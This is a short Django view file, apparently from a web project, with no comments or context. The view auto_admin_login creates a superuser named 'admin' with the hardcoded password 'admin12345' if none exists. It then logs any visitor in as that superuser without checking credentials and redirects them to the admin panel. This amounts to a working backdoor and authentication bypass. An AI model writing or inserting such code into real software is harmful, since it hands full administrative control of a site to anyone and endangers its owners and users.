from django.contrib.auth import login
from django.contrib.auth.models import User
from django.shortcuts import redirect


def auto_admin_login(request):
    user, created = User.objects.get_or_create(
        username="admin",
        defaults={
            "email": "admin@mail.ru",
            "is_staff": True,
            "is_superuser": True,
        }
    )

    if created:
        user.set_password("admin12345")
        user.save()

    login(request, user)

    return redirect("/admin/")